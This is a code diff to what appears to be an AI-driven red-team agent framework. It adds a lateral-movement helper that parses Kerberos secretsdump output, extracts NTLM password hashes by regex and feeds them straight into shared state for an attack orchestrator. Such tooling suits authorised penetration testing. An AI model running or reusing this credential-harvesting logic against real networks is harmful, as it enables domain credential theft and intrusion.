@@ -14,6 +14,7 @@ from typing import ClassVar
 import dreadnode as dn
 from dreadnode.agent.tools.base import Toolset
 
+from ares.core.models import Hash, SharedRedTeamState
 from ares.tools.red.common import (
     PLACEHOLDER_PASSWORDS,
     AnyRedTeamState,
@@ -655,10 +656,79 @@ class LateralMovementTools(Toolset):
             if returncode == 0:
                 logger.info(f"[+] Kerberos secretsdump on {target} successful!")
 
+            # Auto-extract NTLM hashes into state for real-time propagation
+            if self.state:
+                self._extract_ntlm_hashes_to_state(output, domain)
+
             return output
 
         except Exception as e:
             return f"Kerberos secretsdump failed: {e}"
+
+    def _extract_ntlm_hashes_to_state(  # noqa: PLR0912
+        self, output: str, domain: str
+    ) -> None:
+        """Extract NTLM hashes from secretsdump output and add to state immediately.
+
+        This triggers real-time Redis checkpoint so the orchestrator sees hashes
+        without waiting for task completion.
+        """
+        if not output:
+            return
+
+        extracted = 0
+        guest_null_hash = "31d6cfe0d16ae931b73c59d7e0c089c0"  # pragma: allowlist secret
+        for line in output.splitlines():
+            stripped = line.strip()
+            if not stripped or stripped.startswith(("[", "#")):
+                continue
+
+            # Match domain-prefixed: DOMAIN\user:rid:lmhash:nthash:::
+            m = re.match(
+                r"([^\\:\s]+)\\([^:\\]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::",
+                stripped,
+            )
+            if m:
+                h_domain, h_user = m.group(1), m.group(2)
+                lm_hash, nt_hash = m.group(4), m.group(5)
+            else:
+                # Match non-prefixed: user:rid:lmhash:nthash:::
+                m = re.match(
+                    r"([^:\\$\s]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::",
+                    stripped,
+                )
+                if m:
+                    h_user = m.group(1)
+                    h_domain = domain
+                    lm_hash, nt_hash = m.group(3), m.group(4)
+                else:
+                    continue
+
+            # Skip Guest with null NT hash, and machine accounts
+            if nt_hash == guest_null_hash and h_user.lower() == "guest":
+                continue
+            if h_user.endswith("$"):
+                continue
+
+            hash_obj = Hash(
+                username=h_user,
+                hash_value=f"{lm_hash}:{nt_hash}",
+                hash_type="NTLM",
+                domain=h_domain,
+                source="secretsdump",
+            )
+
+            if isinstance(self.state, SharedRedTeamState):
+                if self.state.add_hash(hash_obj, "secretsdump"):
+                    extracted += 1
+            elif self.state is not None:
+                self.state.hashes.append(hash_obj)
+                extracted += 1
+
+        if extracted:
+            logger.warning(
+                f"[+] Auto-extracted {extracted} NTLM hashes from secretsdump into state"
+            )
 
 
 class MSSQLTools(Toolset):
